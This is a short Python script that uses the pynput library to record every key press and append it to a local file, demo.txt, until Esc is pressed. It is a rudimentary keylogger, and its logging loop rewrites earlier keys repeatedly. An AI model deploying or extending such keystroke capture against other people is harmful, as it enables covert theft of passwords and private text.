from pynput.keyboard import Key, Listener 

count =0
k =[]

def on_press(key):
    global k, count
    k.append(key)
    write_1(k)
    count += 1
    print(key)

    if count>=100:
        count =0
        write_1(k)
        k=[]

def write_1(var):
    with open("demo.txt", "a") as f:
        for i in var:
            new_var =str(i).replace("'",'')
            f.write(new_var)
            f.write(" ")


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
